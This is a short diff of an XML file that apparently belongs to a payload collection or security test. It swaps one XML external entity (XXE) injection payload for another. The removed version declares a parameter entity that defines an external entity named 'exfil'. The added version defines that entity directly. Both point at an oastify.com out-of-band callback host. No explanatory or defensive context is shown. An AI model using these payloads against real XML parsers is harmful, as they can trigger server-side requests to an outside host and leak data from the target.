@@ -1,4 +1,1 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ 
-<!ENTITY % all "<!ENTITY exfil SYSTEM 'https://a2dzaty7rzq1s4qguiffe3cp3g97xynmc.oastify.com'>">
-%all;]>
+<!ENTITY exfil SYSTEM "https://a2dzaty7rzq1s4qguiffe3cp3g97xynmc.oastify.com/">
